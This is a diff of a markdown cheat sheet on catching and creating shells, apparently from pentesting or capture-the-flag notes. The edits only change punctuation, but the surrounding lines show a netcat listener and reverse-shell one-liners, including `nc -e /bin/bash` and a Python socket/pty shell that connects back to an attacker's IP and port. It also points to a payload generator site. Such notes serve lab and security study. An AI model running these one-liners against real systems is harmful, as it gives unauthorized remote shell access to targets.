@@ -17,7 +17,7 @@ build:
 | ---------- | ----------- | ------------ | ----- |
 | **reverse** | attacker | target → attacker | the standard; outbound from the target looks less suspicious |
 | **bind** | target | attacker → target | needs an inbound-reachable target port |
-| **webshell** | — | — | half-interactive; run commands via a web app, output on the page |
+| **webshell** | n/a | n/a | half-interactive; run commands via a web app, output on the page |
 
 ## Catching a Reverse Shell
 
@@ -36,7 +36,7 @@ nc -lnvp <port>
 
 ## Creating Reverse Shells
 
-> best resource: **https://revshells.com** — set your IP + port, pick a payload,
+> best resource: **https://revshells.com**; set your IP + port, pick a payload,
 > copy-paste. Offers reverse / bind / webshell / msfvenom variants and a matching listener.
 
 | one-liner (run on target) | note |
@@ -45,7 +45,7 @@ nc -lnvp <port>
 | `nc <ip> <port> -e /bin/bash` | nc with `-e` (if supported) |
 | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'` | python reverse shell |
 
-> if one variant silently fails, try another — behavior differs by target shell/tooling.
+> if one variant silently fails, try another; behavior differs by target shell/tooling.
 
 ## Webshells
 
